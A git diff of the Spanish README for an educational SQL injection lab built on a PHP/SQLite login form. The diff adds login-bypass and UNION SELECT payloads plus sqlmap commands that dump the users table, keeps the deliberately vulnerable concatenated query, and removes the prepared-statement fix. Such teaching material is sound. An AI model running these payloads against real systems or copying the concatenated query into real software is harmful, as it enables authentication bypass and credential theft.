@@ -1,69 +1,124 @@
 # SQL-Injection-Equipo4
 
-Laboratorio educativo para demostrar una vulnerabilidad de **inyección SQL** (OWASP Top 10 – A03: Injection) en un formulario de inicio de sesión hecho con PHP y SQLite, y cómo corregirla con **consultas preparadas**.
+**Aplicación:** Login Vulnerable (Educación a Distancia ITA)
+
+**Vulnerabilidad:** Injection — SQL Injection (OWASP A03:2021 – Injection)
+
+**Tecnologías:** PHP 8, PDO, SQLite, HTML5, CSS3, sqlmap, Python 3, Terminal / PowerShell.
 
 > ⚠️ **Aviso:** este proyecto es una página de prueba para fines educativos. No es un sitio oficial y no debe publicarse en un servidor accesible desde internet.
 
-## Contenido
+## Objetivo
 
-| Archivo | Descripción |
+Identificar y demostrar una vulnerabilidad de **inyección SQL** en un formulario de inicio de sesión provocada por la concatenación directa de datos del usuario dentro de la consulta, ejecutar pruebas de concepto manuales (`admin' --`, `' OR 1=1 --`, `UNION SELECT`) y automatizadas (**sqlmap**), y documentar el impacto. La corrección mediante **consultas preparadas** se desarrolla y explica en clase.
+
+## Descripción de la práctica
+
+La aplicación es un formulario de login desarrollado con PHP y SQLite que valida un usuario y una contraseña contra la tabla `usuarios`.
+
+En su versión insegura, la consulta se arma concatenando directamente el texto que escribe el usuario:
+
+```php
+$sql = "SELECT usuario, password FROM usuarios WHERE usuario = '$usuario' AND password = '$password'";
+```
+
+Esto corresponde a la categoría **OWASP A03:2021 – Injection**. Al no separar los datos de la instrucción SQL, caracteres y palabras como comillas, `--`, `OR` o `UNION` pueden cambiar la estructura y el significado de la consulta, permitiendo:
+
+- **Autenticación sin credenciales** (bypass del login).
+- **Extracción de datos** de la tabla mediante `UNION SELECT`.
+- **Explotación automatizada** con sqlmap.
+
+La práctica consiste en reproducir estas fallas de forma manual y con sqlmap, documentar las evidencias, y posteriormente (en clase) aplicar el correctivo con consultas preparadas.
+
+## Herramientas necesarias
+
+| Herramienta | Uso |
 |---|---|
-| `index.php` | Página de login (versión vulnerable y versión segura en el mismo archivo). |
-| `db.php` | Conexión a SQLite. Crea la base de datos, la tabla y el usuario de prueba automáticamente. |
-| `logo.png`, `ead.png`, `fondo.jpg` | Imágenes de la interfaz. |
+| PHP 8 (o 7.4+) | Lenguaje y entorno de ejecución de la aplicación |
+| XAMPP | Paquete que incluye PHP y Apache para servir la aplicación en Windows |
+| Extensión `pdo_sqlite` | Conexión a la base de datos SQLite (incluida en XAMPP) |
+| Python 3 | Requerido para ejecutar sqlmap |
+| sqlmap | Explotación automatizada de la inyección SQL |
+| Navegador web | Pruebas manuales e inspección de la interfaz |
+| Visual Studio Code | Revisión y edición del código fuente |
+| Terminal / PowerShell | Ejecución de comandos de servidor y de sqlmap |
+| Git | Clonar los repositorios del proyecto y de sqlmap |
 
-La base de datos `demo.db` **no se incluye en el repositorio**: se genera sola la primera vez que se abre la página.
+> Nota: todas las pruebas se realizan localmente en Windows (también funciona en macOS o Linux).
 
-## Requisitos
+## Preparación del entorno
 
-- **PHP 7.4 o superior** (probado con PHP 8.2).
-- Extensión **`pdo_sqlite`** habilitada (viene activa por defecto en XAMPP y en la mayoría de instalaciones).
-- Git (para clonar el repositorio).
+### 1. Instalar XAMPP (Windows)
 
-Verifica tu instalación:
+Descarga XAMPP desde <https://www.apachefriends.org/es/index.html> e instálalo (por defecto en `C:\xampp`). XAMPP incluye **PHP**, **Apache** y la extensión **`pdo_sqlite`** ya habilitada, por lo que no es necesario instalar PHP por separado.
+
+### 2. Verificar PHP y la extensión SQLite
 
 ```bash
 php -v
-php -m | grep -i sqlite      # Linux / macOS / Git Bash
 php -m | findstr /i sqlite   # Windows (CMD / PowerShell)
+php -m | grep -i sqlite      # Linux / macOS / Git Bash
 ```
 
-Debe aparecer `pdo_sqlite` en la lista.
+Debe aparecer `pdo_sqlite` en la lista (viene activa por defecto en XAMPP).
 
-## Instalación
+> En Windows, si `php` no se reconoce como comando, usa la ruta completa `C:\xampp\php\php.exe`.
+
+### 3. Clonar el repositorio
 
 ```bash
 git clone https://github.com/JonathanHe956/SQL-Injection-Equipo4.git
 cd SQL-Injection-Equipo4
 ```
 
-## Ejecución
+### 4. Ejecutar la aplicación
 
-### Opción 1: Servidor integrado de PHP (recomendado)
-
-Desde la carpeta del proyecto:
+Opción 1 — Servidor integrado de PHP (recomendado):
 
 ```bash
 php -S localhost:8000
 ```
 
-Abre directamente el archivo de inicio en el navegador: <http://localhost:8000/index.php>
-
-Para detener el servidor presiona `Ctrl + C`.
+Abre en el navegador: <http://localhost:8000/index.php>. Para detener el servidor presiona `Ctrl + C`.
 
 > En Windows con XAMPP, si `php` no se reconoce como comando, usa la ruta completa:
->
 > ```bash
 > C:\xampp\php\php.exe -S localhost:8000
 > ```
->
-> El comando `-S` solo recibe `localhost:puerto`; abre `/index.php` en el navegador.
 
-### Opción 2: XAMPP (Apache)
+Opción 2 — XAMPP (Apache):
 
-1. Copia la carpeta del proyecto dentro de `C:\xampp\htdocs\` (por ejemplo `C:\xampp\htdocs\SQL-Injection-Equipo4`).
+1. Copia la carpeta dentro de `C:\xampp\htdocs\`.
 2. Abre el **XAMPP Control Panel** e inicia **Apache**.
-3. Abre en el navegador: <http://localhost/SQL-Injection-Equipo4/>
+3. Abre: <http://localhost/SQL-Injection-Equipo4/>
+
+## Instalación de sqlmap en Windows
+
+sqlmap está escrito en Python, por lo que primero se necesita Python 3.
+
+### 1. Instalar Python 3
+
+Descarga Python desde <https://www.python.org/downloads/windows/> e instálalo. **Marca la casilla "Add Python to PATH"** durante la instalación. Verifica:
+
+```powershell
+python --version
+```
+
+### 2. Instalar sqlmap con pip
+
+```powershell
+pip install sqlmap
+```
+
+> Alternativa sin pip: clónalo con Git con `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev` y ejecútalo con `python sqlmap.py ...` desde esa carpeta.
+
+### 3. Verificar que funciona
+
+```powershell
+sqlmap --version
+```
+
+Debe mostrar la versión de sqlmap.
 
 ## Base de datos
 
@@ -72,7 +127,9 @@ Al cargar la página por primera vez, `db.php`:
 1. Crea el archivo `demo.db` (SQLite) si no existe.
 2. Crea la tabla `usuarios` si no existe.
 3. Inserta el usuario `admin` si la tabla está vacía.
-4. Agrega las cuentas de demostración que aún no existan, incluso si la base de datos ya tenía datos.
+4. Agrega las cuentas de demostración que aún no existan.
+
+La base `demo.db` **no se incluye en el repositorio**: se genera sola.
 
 **Credenciales de prueba:**
 
@@ -89,82 +146,115 @@ Al cargar la página por primera vez, `db.php`:
 Para reiniciar la base de datos, borra el archivo y recarga la página:
 
 ```bash
+del demo.db       # Windows (CMD / PowerShell)
 rm demo.db        # Linux / macOS / Git Bash
-del demo.db       # Windows (CMD)
 ```
 
 > La carpeta del proyecto debe tener permisos de escritura para que PHP pueda crear `demo.db`.
 
-## Uso del laboratorio
+## Demostración de las vulnerabilidades (Versión Insegura)
 
-### 1. Versión vulnerable (activa por defecto)
+> Para estas pruebas debe estar activa la **consulta vulnerable** en `index.php` (el bloque concatenado). Las dos versiones conviven comentadas en el archivo mediante `//`.
 
-En `index.php` la consulta se arma concatenando directamente lo que escribe el usuario:
+### Prueba 1. Bypass de autenticación (`OR 1=1`)
 
-```php
-$sql = "SELECT usuario, password FROM usuarios WHERE usuario = '$usuario' AND password = '$password'";
-$filas = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
-```
+En el campo **Usuario** escribe una de estas cargas (la **Contraseña** puede quedar vacía o con cualquier texto):
 
-Prueba a iniciar sesión con estos datos:
-
-| Campo | Valor |
+| Campo Usuario | Efecto |
 |---|---|
-| Usuario | `' OR '1'='1' --` |
-| Contraseña | cualquier texto |
+| `admin' --` | Inicia sesión como `admin` comentando la comprobación de la contraseña |
+| `' OR 1=1 --` | Accede sin credenciales porque la condición siempre es verdadera |
 
-Resultado: **"Acceso concedido"** sin conocer la contraseña. La consulta que se ejecuta queda así:
+**Resultado esperado:** "Acceso concedido" sin conocer la contraseña. Por ejemplo, con `' OR 1=1 --` la consulta ejecutada queda así:
 
 ```sql
-SELECT usuario, password FROM usuarios WHERE usuario = '' OR '1'='1' --' AND password = '...'
+SELECT usuario, password FROM usuarios WHERE usuario = '' OR 1=1 --' AND password = '...'
 ```
 
-La condición `'1'='1'` siempre es verdadera y `--` convierte en comentario el resto de la consulta, así que la verificación de la contraseña se ignora.
+La condición `1=1` siempre es verdadera y `--` comenta el resto de la consulta, así que la verificación de la contraseña se ignora. Con `admin' --`, la comilla cierra el nombre `admin` y `--` comenta la parte de la contraseña, iniciando sesión como ese usuario.
 
-### 2. Versión segura (consultas preparadas)
+### Prueba 2. Extracción de datos (`UNION SELECT`)
 
-Para mostrar en clase cómo se corrige, edita `index.php` y reemplaza el bloque vulnerable completo (desde la asignación de `$sql` hasta el `catch`) por este:
+En el campo **Usuario**, ingresa una carga que una otra consulta. La consulta original devuelve dos columnas (`usuario` y `password`), por lo que el `UNION SELECT` debe devolver dos columnas:
 
-```php
-$sql = "SELECT usuario, password FROM usuarios WHERE usuario = ? AND password = ?";
-try {
-  $stmt = $db->prepare($sql);
-  $stmt->execute([$usuario, $password]);
-  $filas = $stmt->fetchAll(PDO::FETCH_ASSOC);
-} catch (PDOException $error) {
-  error_log('Error en la consulta del login: ' . $error->getMessage());
-  $filas = [];
-}
+```
+' UNION SELECT usuario, password FROM usuarios --
 ```
 
-No dejes activa también la consulta vulnerable. Los signos `?` son parámetros: PDO envía el usuario y la contraseña como valores, no como parte del SQL. El resto del código puede permanecer igual.
+**Resultado esperado:** si la prueba se ejecuta desde localhost, se listan las cuentas de la tabla; cada resultado muestra encima el texto `UNION` ingresado y debajo los campos Usuario y Contraseña.
 
-**¿Por qué funciona esta solución?** Con la consulta vulnerable, el programa concatena lo escrito en los campos dentro del texto SQL. Así, caracteres y palabras como comillas, `UNION` o comentarios pueden cambiar la estructura y el significado de la consulta. Con `prepare()`, primero se define y prepara la estructura SQL con sus espacios para parámetros; luego `execute()` envía los datos por separado. La base de datos trata esos datos como valores literales, no como instrucciones SQL. Por eso el mismo intento se compara como un nombre de usuario y contraseña, no se ejecuta como una unión de consultas, y no devuelve la lista de cuentas. Las consultas preparadas son la defensa principal; validar entradas y mostrar errores genéricos también ayuda, pero no sustituye este mecanismo.
+### Prueba 3. Explotación automatizada con sqlmap
 
-**Comprueba el cambio:**
+Con la aplicación corriendo (`http://localhost:8000/index.php`), ejecuta:
 
-1. Guarda `index.php` y recarga la página.
-2. Prueba de nuevo la misma entrada `UNION` que utilizaste con la versión vulnerable. Ahora debe aparecer **"Datos incorrectos"** y no debe mostrarse la lista de cuentas.
-3. Comprueba que el inicio de sesión normal todavía funciona con una cuenta de prueba válida.
+**1. Detectar la inyección**
 
-Así puedes mostrar ambas etapas en clase: primero la consulta vulnerable y después el mismo intento rechazado al sustituirla por la versión preparada.
+```powershell
+sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --batch
+```
 
-### 3. Práctica de `UNION SELECT` desde el login
+**2. Confirmar el motor de la base de datos (SQLite)**
 
-La prueba se realiza directamente en el campo **Usuario** del mismo formulario de login; no hay un segundo apartado. La consulta vulnerable devuelve las columnas `usuario` y `password`, por lo que la parte `UNION SELECT` debe devolver dos columnas. Si la prueba se ejecuta desde localhost, cada resultado muestra encima el texto UNION ingresado y debajo los campos Usuario y Contraseña.
+```powershell
+sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --dbms=sqlite --batch
+```
 
-Este ejercicio usa exclusivamente la base SQLite local del laboratorio. No publiques la práctica ni la conectes a datos reales.
+**3. Listar las tablas**
 
-## Buenas prácticas para prevenir inyección SQL
+```powershell
+sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --dbms=sqlite --tables --batch
+```
 
-- Usar siempre **consultas preparadas** (parámetros `?` o con nombre) en lugar de concatenar texto.
-- Validar y limitar los datos de entrada.
-- Guardar contraseñas con hash (`password_hash()` / `password_verify()`), nunca en texto plano.
-- Usar cuentas de base de datos con los permisos mínimos necesarios.
-- No mostrar errores de SQL al usuario final.
+**4. Volcar la tabla `usuarios`**
+
+```powershell
+sqlmap -u "http://localhost:8000/index.php" --data="usuario=admin&password=admin123" -p usuario --dbms=sqlite -T usuarios --dump --batch
+```
+
+**Resultado esperado:** sqlmap identifica el parámetro `usuario` como **inyectable**, determina el motor (SQLite) y, con `--dump`, extrae el contenido de la tabla `usuarios` (usuarios y contraseñas en texto plano).
+
+## Tabla de Resultados Esperados
+
+| Prueba | Versión Vulnerable | Versión Corregida |
+|---|---|---|
+| `admin' --` en Usuario | Inicia sesión como `admin` sin contraseña | "Datos incorrectos" |
+| `' OR 1=1 --` en Usuario | Acceso concedido (bypass del login) | "Datos incorrectos" |
+| `UNION SELECT ...` en Usuario | Lista las cuentas de la tabla | "Datos incorrectos" / sin listado |
+| sqlmap sobre el parámetro `usuario` | Parámetro inyectable; base de datos extraída | Parámetro no inyectable |
+| Login normal (cuenta válida) | Acceso concedido | Acceso concedido |
+
+> La corrección (consultas preparadas) se aplica y explica en clase; por eso en este repositorio no se incluye el código de la solución.
+
+## Evidencias recomendadas para el reporte
+
+Las evidencias se documentan en formato **antes y después**: primero el ataque funcionando sobre la versión vulnerable y luego el mismo ataque rechazado tras aplicar la corrección en clase (sin mostrar el código de la solución).
+
+### Antes (versión vulnerable)
+
+- **Formulario de login:** captura de la pantalla de inicio de sesión.
+- **Bypass con `admin' --`:** campo Usuario con `admin' --` y el resultado "Acceso concedido".
+- **Bypass con `' OR 1=1 --`:** campo Usuario con `' OR 1=1 --` y el resultado "Acceso concedido".
+- **UNION SELECT (entrada):** campo Usuario con `' UNION SELECT usuario, password FROM usuarios --`.
+- **UNION SELECT (resultado):** listado de cuentas (usuarios y contraseñas) mostrado por la inyección.
+- **sqlmap — comando 1 (detectar):** captura de `sqlmap ... -p usuario --batch` marcando el parámetro como inyectable.
+- **sqlmap — comando 2 (motor):** captura de `sqlmap ... --dbms=sqlite --batch` confirmando SQLite.
+- **sqlmap — comando 3 (tablas):** captura de `sqlmap ... --tables --batch` con el listado de tablas.
+- **sqlmap — comando 4 (volcado):** captura de `sqlmap ... -T usuarios --dump --batch` con los usuarios y contraseñas extraídos.
+
+### Después (versión corregida)
+
+- **Bypass bloqueado:** `admin' --` y `' OR 1=1 --` ahora devuelven "Datos incorrectos".
+- **UNION bloqueado:** la misma entrada `UNION SELECT` ya no muestra el listado de cuentas.
+- **sqlmap sin resultados:** una sola captura ejecutando un comando de sqlmap que ahora indica que el parámetro `usuario` no parece inyectable.
+- **Login normal:** una cuenta válida sigue iniciando sesión correctamente.
+
+## Conclusión de la práctica
+
+Esta actividad demuestra cómo la concatenación directa de datos del usuario dentro de una consulta SQL (OWASP A03:2021 – Injection) permite evadir la autenticación, extraer información de la base de datos y automatizar por completo el ataque con herramientas como sqlmap. La corrección mediante **consultas preparadas** —que separan la instrucción SQL de los datos— se desarrolla y explica en clase.
 
 ## Referencias
 
 - [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
 - [OWASP Cheat Sheet – Prevención de SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [sqlmap – sitio oficial](https://sqlmap.org/)
 - [PHP – PDO y sentencias preparadas](https://www.php.net/manual/es/pdo.prepared-statements.php)
